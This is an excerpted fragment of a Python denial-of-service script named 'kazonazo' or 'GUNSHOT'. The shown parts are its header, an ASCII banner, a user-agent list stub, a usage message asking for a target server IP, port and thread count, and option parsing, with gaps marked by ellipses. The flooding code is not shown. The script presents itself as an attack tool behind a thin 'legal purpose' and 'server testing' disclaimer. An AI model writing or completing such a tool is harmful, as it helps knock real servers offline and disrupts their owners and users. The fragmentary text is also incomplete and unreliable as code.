...
# python 3.3.2+ kazonazo Dos 

# only for legal purpose
'''
__author__ = ' abba y abdullahi '
__copyright__ = ' by abba y abdullahi , lastloaded@mail.com'
__version__ = ' 0.0t'
'''
...
os.system('figlet   GUNSHOT ')
#os.system('figlet GUNSHUT D.D.O.S. EXPLOIT')
def user_agent():
	global uagent
	uagent=[]
...
def usage():
	print (''' \033[92m	 A . Y .A Dos Script v.1 http://www.teachbang.com/
	It is the end user's responsibility to obey all applicable laws.
	It is just for server testing script. Your ip is visible. \n
	usage : python3 kazonazo.py [-s] [-p] [-t]
	-h : help
	-s : server ip
	-p : port default 80
...
def get_parameters():
	...
	global thr
	global item
	optp = OptionParser(add_help_option=False,epilog="Kazonazo")
